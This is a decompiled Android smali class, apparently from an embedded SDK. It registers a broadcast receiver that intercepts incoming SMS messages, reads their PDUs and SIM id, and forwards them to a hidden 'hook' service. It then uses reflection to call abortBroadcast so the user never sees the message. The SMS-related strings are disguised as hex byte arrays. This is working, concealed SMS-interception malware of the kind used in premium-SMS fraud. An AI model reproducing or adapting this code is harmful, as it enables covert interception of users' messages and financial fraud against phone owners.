.class public Lcom/snowfish/a/a/s/ABFlt;
.super Landroid/content/BroadcastReceiver;
.source "ABFlt.java"


# static fields
.field private static final a:[B

.field private static final b:[B

.field private static c:[B

.field private static final d:[B

.field private static final e:[B


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 21
    const-class v0, Lcom/snowfish/a/a/s/ABFlt;

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 23
    const/16 v0, 0x27

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lcom/snowfish/a/a/s/ABFlt;->a:[B

    .line 25
    const/16 v0, 0x19

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    sput-object v0, Lcom/snowfish/a/a/s/ABFlt;->b:[B

    .line 27
    const/16 v0, 0xe

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    sput-object v0, Lcom/snowfish/a/a/s/ABFlt;->c:[B

    .line 30
    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    sput-object v0, Lcom/snowfish/a/a/s/ABFlt;->d:[B

    .line 33
    const/16 v0, 0x24

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    sput-object v0, Lcom/snowfish/a/a/s/ABFlt;->e:[B

    return-void

    .line 23
    :array_0
    .array-data 1
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x64t
        0x65t
        0x72t
        0x2et
        0x54t
        0x65t
        0x6ct
        0x65t
        0x70t
        0x68t
        0x6ft
        0x6et
        0x79t
        0x2et
        0x53t
        0x4dt
        0x53t
        0x5ft
        0x52t
        0x45t
        0x43t
        0x45t
        0x49t
        0x56t
        0x45t
        0x44t
    .end array-data

    .line 25
    :array_1
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x73t
        0x6et
        0x6ft
        0x77t
        0x66t
        0x69t
        0x73t
        0x68t
        0x2et
        0x61t
        0x2et
        0x61t
        0x2et
        0x73t
        0x2et
        0x41t
        0x42t
        0x47t
        0x53t
        0x76t
        0x63t
    .end array-data

    .line 27
    nop

    :array_2
    .array-data 1
        0x61t
        0x62t
        0x6ft
        0x72t
        0x74t
        0x42t
        0x72t
        0x6ft
        0x61t
        0x64t
        0x63t
        0x61t
        0x73t
        0x74t
    .end array-data

    .line 30
    nop

    :array_3
    .array-data 1
        0x70t
        0x64t
        0x75t
        0x73t
    .end array-data

    .line 33
    :array_4
    .array-data 1
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x69t
        0x6et
        0x74t
        0x65t
        0x6et
        0x74t
        0x2et
        0x61t
        0x63t
        0x74t
        0x69t
        0x6ft
        0x6et
        0x2et
        0x42t
        0x4ft
        0x4ft
        0x54t
        0x5ft
        0x43t
        0x4ft
        0x4dt
        0x50t
        0x4ct
        0x45t
        0x54t
        0x45t
        0x44t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 20
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private a()V
    .locals 3

    .prologue
    .line 140
    :try_start_0
    const-class v0, Landroid/content/BroadcastReceiver;

    .line 141
    new-instance v1, Ljava/lang/String;

    sget-object v2, Lcom/snowfish/a/a/s/ABFlt;->c:[B

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([B)V

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Class;

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 142
    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Object;

    invoke-virtual {v0, p0, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 145
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private a(Landroid/content/Context;I)V
    .locals 3

    .prologue
    .line 38
    new-instance v0, Lcom/snowfish/a/a/l/j;

    invoke-direct {v0}, Lcom/snowfish/a/a/l/j;-><init>()V

    .line 39
    invoke-virtual {v0, p2}, Lcom/snowfish/a/a/l/j;->a(I)V

    .line 40
    new-instance v1, Landroid/content/Intent;

    sget-object v2, Lcom/snowfish/a/a/s/ABFlt;->b:[B

    invoke-static {v2}, Lcom/snowfish/a/a/l/e;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, p1, v1}, Lcom/snowfish/a/a/s/ABFlt;->peekService(Landroid/content/Context;Landroid/content/Intent;)Landroid/os/IBinder;

    move-result-object v1

    .line 41
    if-nez v1, :cond_0

    .line 50
    :goto_0
    return-void

    .line 43
    :cond_0
    invoke-static {v1}, Lcom/snowfish/a/a/s/IABGSvc$Stub;->asInterface(Landroid/os/IBinder;)Lcom/snowfish/a/a/s/IABGSvc;

    move-result-object v1

    .line 45
    :try_start_0
    invoke-virtual {v0}, Lcom/snowfish/a/a/l/j;->a()[B

    move-result-object v0

    invoke-interface {v1, v0}, Lcom/snowfish/a/a/s/IABGSvc;->call([B)[B
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 46
    :catch_0
    move-exception v0

    .line 48
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 8

    .prologue
    const/4 v4, 0x1

    const/4 v3, 0x0

    .line 55
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 56
    invoke-static {p1}, Lcom/snowfish/a/a/l/d;->a(Landroid/content/Context;)V

    .line 57
    const-string v1, "idle Action"

    invoke-static {v1, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 59
    const-string v1, "LOCATION_SERVICE"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 60
    const/16 v0, 0x9

    invoke-direct {p0, p1, v0}, Lcom/snowfish/a/a/s/ABFlt;->a(Landroid/content/Context;I)V

    .line 136
    :cond_0
    :goto_0
    return-void

    .line 61
    :cond_1
    const-string v1, "android.intent.action.USER_PRESENT"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 62
    const/16 v0, 0xa

    invoke-direct {p0, p1, v0}, Lcom/snowfish/a/a/s/ABFlt;->a(Landroid/content/Context;I)V

    goto :goto_0

    .line 63
    :cond_2
    const-string v1, "android.intent.action.ACTION_SHUTDOWN"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 64
    const/16 v0, 0xb

    invoke-direct {p0, p1, v0}, Lcom/snowfish/a/a/s/ABFlt;->a(Landroid/content/Context;I)V

    goto :goto_0

    .line 65
    :cond_3
    sget-object v1, Lcom/snowfish/a/a/s/ABFlt;->e:[B

    invoke-static {v1}, Lcom/snowfish/a/a/l/e;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 67
    sget-object v1, Lcom/snowfish/a/a/s/ABFlt;->a:[B

    invoke-static {v1}, Lcom/snowfish/a/a/l/e;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 68
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v5

    .line 69
    if-eqz v5, :cond_0

    .line 72
    sget-object v0, Lcom/snowfish/a/a/s/ABFlt;->d:[B

    invoke-static {v0}, Lcom/snowfish/a/a/l/e;->a([B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    .line 73
    if-eqz v0, :cond_0

    .line 79
    new-instance v6, Lcom/snowfish/a/a/l/j;

    invoke-direct {v6}, Lcom/snowfish/a/a/l/j;-><init>()V

    .line 80
    invoke-virtual {v6, v4}, Lcom/snowfish/a/a/l/j;->a(I)V

    .line 81
    array-length v1, v0

    invoke-virtual {v6, v1}, Lcom/snowfish/a/a/l/j;->a(I)V

    move v2, v3

    .line 82
    :goto_1
    array-length v1, v0

    if-lt v2, v1, :cond_4

    .line 92
    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    invoke-static {v0}, Lcom/snowfish/a/a/l/e;->a([B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    .line 93
    if-eqz v0, :cond_6

    .line 95
    :try_start_0
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    .line 98
    :goto_2
    invoke-virtual {v6, v0}, Lcom/snowfish/a/a/l/j;->a(I)V

    .line 100
    invoke-static {}, Landroid/os/Parcel;->obtain()Landroid/os/Parcel;

    move-result-object v0

    .line 101
    invoke-virtual {p2, v0, v3}, Landroid/content/Intent;->writeToParcel(Landroid/os/Parcel;I)V

    .line 102
    invoke-virtual {v0}, Landroid/os/Parcel;->marshall()[B

    move-result-object v1

    .line 103
    invoke-virtual {v6, v1}, Lcom/snowfish/a/a/l/j;->a([B)V

    .line 104
    invoke-virtual {v0}, Landroid/os/Parcel;->recycle()V

    .line 109
    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lcom/snowfish/a/a/s/ABFlt;->b:[B

    invoke-static {v1}, Lcom/snowfish/a/a/l/e;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 108
    invoke-virtual {p0, p1, v0}, Lcom/snowfish/a/a/s/ABFlt;->peekService(Landroid/content/Context;Landroid/content/Intent;)Landroid/os/IBinder;

    move-result-object v0

    .line 110
    if-nez v0, :cond_7

    .line 111
    invoke-static {p1}, Lcom/snowfish/a/a/l/AIdleServiceLoader;->getInstance(Landroid/content/Context;)Lcom/snowfish/a/a/l/AIdleServiceLoader;

    move-result-object v0

    invoke-virtual {v0}, Lcom/snowfish/a/a/l/AIdleServiceLoader;->getHookService()Lcom/snowfish/a/a/p/IAHookService;

    move-result-object v0

    .line 114
    if-eqz v0, :cond_0

    .line 115
    invoke-virtual {v6}, Lcom/snowfish/a/a/l/j;->a()[B

    move-result-object v1

    invoke-interface {v0, p1, v1, v4}, Lcom/snowfish/a/a/p/IAHookService;->process(Landroid/content/Context;[BZ)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 116
    invoke-direct {p0}, Lcom/snowfish/a/a/s/ABFlt;->a()V

    goto/16 :goto_0

    .line 83
    :cond_4
    aget-object v1, v0, v2

    check-cast v1, [B

    .line 84
    if-nez v1, :cond_5

    .line 85
    invoke-virtual {v6, v3}, Lcom/snowfish/a/a/l/j;->a(I)V

    .line 82
    :goto_3
    add-int/lit8 v1, v2, 0x1

    move v2, v1

    goto :goto_1

    .line 87
    :cond_5
    array-length v7, v1

    invoke-virtual {v6, v7}, Lcom/snowfish/a/a/l/j;->a(I)V

    .line 88
    invoke-virtual {v6, v1}, Lcom/snowfish/a/a/l/j;->a([B)V

    goto :goto_3

    :catch_0
    move-exception v0

    :cond_6
    move v0, v3

    goto :goto_2

    .line 120
    :cond_7
    invoke-static {v0}, Lcom/snowfish/a/a/s/IABGSvc$Stub;->asInterface(Landroid/os/IBinder;)Lcom/snowfish/a/a/s/IABGSvc;

    move-result-object v0

    .line 124
    :try_start_1
    invoke-virtual {v6}, Lcom/snowfish/a/a/l/j;->a()[B

    move-result-object v1

    invoke-interface {v0, v1}, Lcom/snowfish/a/a/s/IABGSvc;->call([B)[B
    :try_end_1
    .catch Landroid/os/RemoteException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v0

    .line 128
    :goto_4
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "called "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 129
    if-eqz v0, :cond_0

    .line 130
    new-instance v1, Lcom/snowfish/a/a/l/i;

    invoke-direct {v1, v0}, Lcom/snowfish/a/a/l/i;-><init>([B)V

    .line 132
    iget v0, v1, Lcom/snowfish/a/a/l/i;->b:I

    iget v2, v1, Lcom/snowfish/a/a/l/i;->c:I

    if-lt v0, v2, :cond_8

    move v0, v3

    :goto_5
    if-nez v0, :cond_9

    :goto_6
    if-eqz v3, :cond_0

    .line 133
    invoke-direct {p0}, Lcom/snowfish/a/a/s/ABFlt;->a()V

    goto/16 :goto_0

    .line 126
    :catch_1
    move-exception v0

    const/4 v0, 0x0

    goto :goto_4

    .line 132
    :cond_8
    iget v0, v1, Lcom/snowfish/a/a/l/i;->b:I

    add-int/lit8 v0, v0, 0x1

    iput v0, v1, Lcom/snowfish/a/a/l/i;->b:I

    iget-object v0, v1, Lcom/snowfish/a/a/l/i;->a:[B

    iget v1, v1, Lcom/snowfish/a/a/l/i;->b:I

    add-int/lit8 v1, v1, -0x1

    aget-byte v0, v0, v1

    goto :goto_5

    :cond_9
    move v3, v4

    goto :goto_6

    .line 92
    nop

    :array_0
    .array-data 1
        0x73t
        0x69t
        0x6dt
        0x49t
        0x64t
    .end array-data
.end method
